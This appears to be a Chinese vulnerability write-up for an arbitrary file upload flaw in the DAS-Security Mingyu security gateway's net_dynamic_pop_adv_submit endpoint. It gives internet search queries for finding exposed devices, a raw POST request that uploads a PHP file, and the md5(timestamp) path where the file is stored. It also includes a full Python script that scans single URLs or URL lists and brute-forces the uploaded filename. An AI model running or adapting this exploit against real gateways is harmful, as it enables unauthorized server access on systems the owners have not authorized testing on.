# 安恒明御安全网关net_dynamic_pop_adv_submit存在任意文件上传漏洞

# 一、漏洞简介
安恒信息明御安全网关<font style="color:rgb(0, 0, 0);">（以下简称“NGFW”）秉持安全可视、简单有效的理念，以资产为视角，构建“事前+事中+事后”全流程防御的下一代安全防护体系，并融合传统防火墙、</font>入侵防御系统<font style="color:rgb(0, 0, 0);">、防病毒网关、上网行为管控、VPN网关、威胁情报等</font>安全模块<font style="color:rgb(0, 0, 0);">于一体的智慧化安全网关。安恒明御安全网关net_dynamic_pop_adv_submit存在任意文件上传漏洞。攻击者可通过该漏洞获取服务器权限。</font>

# <font style="color:rgb(0, 0, 0);">二、影响版本</font>
+ 安恒明御安全网关

# 三、资产测绘
+ hunter`app.name="安恒明御安全网关"`
+ fofa`title="明御安全网关"`
+ 特征

![image](https://github.com/user-attachments/assets/c02b591e-4d86-4929-8096-2c3c2b5d1af9)

# 四、漏洞复现
```plain
POST /webui/?g=net_dynamic_pop_adv_submit HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Content-Length: 196
Content-Type: multipart/form-data; boundary=qqobiandqgawlxodfiisporjwravxtvd

--qqobiandqgawlxodfiisporjwravxtvd
Content-Disposition: form-data; name="filename"; filename="9B9Ccd.php"
Content-Type: text/plain

2ZqGNnsjzzU2GBBPyd8AIA7QlDq
--qqobiandqgawlxodfiisporjwravxtvd--
```
文件上传位置
```
文件会以时间戳md5的方式存储在/adv/image/md5(时间戳).php
```
python利用脚本
```
import requests,re
import urllib3
import string,random
from urllib.parse import urljoin,quote
import argparse
from bs4 import BeautifulSoup
import ssl
ssl._create_default_https_context = ssl._create_unverified_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import time
import hashlib

def read_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.read().splitlines()
    return urls
def check(url):
        url = url.rstrip("/")
        target = urljoin(url,"/webui/?g=net_dynamic_pop_adv_submit")
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Connection": "close",
            "Content-Length": "203",
            "Accept-Encoding": "gzip",
            "Content-Type": "multipart/form-data; boundary=qqobiandqgawlxodfiisporjwravxtvd"
        }
        data="--qqobiandqgawlxodfiisporjwravxtvd\nContent-Disposition: form-data; name=\"filename\"; filename=\"9B9Ccd.php\"\nContent-Type: text/plain\n\n2ZqGNnsjzzU2GBBPyd8AIA7QlDq\n--qqobiandqgawlxodfiisporjwravxtvd--"
            # 获取当前时间的UNIX时间戳（毫秒级）
        try:
            proxy_address = 'http://127.0.0.1:8080'
            proxies = {
                    'http': proxy_address,
                    'https': proxy_address
            }
            response = requests.post(target, headers=headers, data=data, verify=False,timeout=3)#,proxies=proxies)
            if response.status_code != 200  or 'g=net_dynamic_pop_adv' not in response.text:
                print(f"\033[31m未找到:{url}: 不存在安恒net_dynamic_pop_adv_submit文件上传漏洞\033[0m")
                return True 
            else:
                print(f"\033[31m{url}地址存在安恒net_dynamic_pop_adv_submit文件上传漏洞，开始爆破(由于该网关很多设备时间不对，可能找不到上传文件，可循环爆破一整天的时间，即加/减86400秒，大概率可找到)\033[0m")
            current_unix_timestamp_ms = int(time.time())
            for i in range(1, 20):
                current_unix_timestamp_ms1 = (current_unix_timestamp_ms-5)+i
                # 打印当前的UNIX时间戳（毫秒级）
                print("第一次破解（北京时间）：当前地址",url,"UNIX时间戳（毫秒级）:", current_unix_timestamp_ms1)
                # 将时间戳转换为字符串，因为hashlib不能直接对整数进行哈希
                timestamp_str = str(current_unix_timestamp_ms1)
                # 创建一个md5哈希对象
                md5_hash = hashlib.md5()
                # 更新哈希对象的内容，传递字符串的bytes表示
                md5_hash.update(timestamp_str.encode('utf-8'))
                # 获取十六进制表示的哈希值字符串
                md5_result = md5_hash.hexdigest()
                # 打印MD5加密后的结果
                print("第一次破解（北京时间）：当前地址",url,"UNIX时间戳（毫秒级）的MD5加密结果:", md5_result)
                target1 = urljoin(url,"/adv/image/%s.php" % md5_result)
                headers1 = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                }
                response1 = requests.get(target1, headers=headers1, verify=False,timeout=5)#,proxies=proxies)
                if response1.status_code == 200  and '2ZqGNnsjzz' in response1.text:
                    print(f"\033[31mDiscovered:{url}/adv/image/{md5_result}.php: 存在安恒net_dynamic_pop_adv_submit文件上传漏洞\033[0m")
                    return True
            for i in range(1, 20):
                current_unix_timestamp_ms2 = (current_unix_timestamp_ms+600)+i
                # 打印当前的UNIX时间戳（毫秒级）
                print("第二次破解（快10分钟）：当前地址",url,"UNIX时间戳（毫秒级）:", current_unix_timestamp_ms2)
                # 将时间戳转换为字符串，因为hashlib不能直接对整数进行哈希
                timestamp_str = str(current_unix_timestamp_ms2)
                # 创建一个md5哈希对象
                md5_hash = hashlib.md5()
                # 更新哈希对象的内容，传递字符串的bytes表示
                md5_hash.update(timestamp_str.encode('utf-8'))
                # 获取十六进制表示的哈希值字符串
                md5_result = md5_hash.hexdigest()
                # 打印MD5加密后的结果
                print("第二次破解（快10分钟）：当前地址",url,"UNIX时间戳（毫秒级）的MD5加密结果:", md5_result)
                target2 = urljoin(url,"/adv/image/%s.php" % md5_result)
                headers2 = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
                }   
                response2 = requests.get(target2, headers=headers2, verify=False,timeout=5)#,proxies=proxies)
                if response2.status_code == 200  and '2ZqGNnsjzz' in response2.text:
                    print(f"\033[31mDiscovered爆破成功，找到上传文件:{url}/adv/image/{md5_result}.php: 存在安恒net_dynamic_pop_adv_submit文件上传漏洞\033[0m")
                    return True   
        except Exception as e:
            pass
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="URL")
    parser.add_argument("-f", "--txt", help="file")
    args = parser.parse_args()
    url = args.url
    txt = args.txt
    if url:
        # 记录当前时间
        check(url)
    elif txt:
        urls = read_file(txt)
        for url in urls:
            check(url)
    else:
        print("help")
```
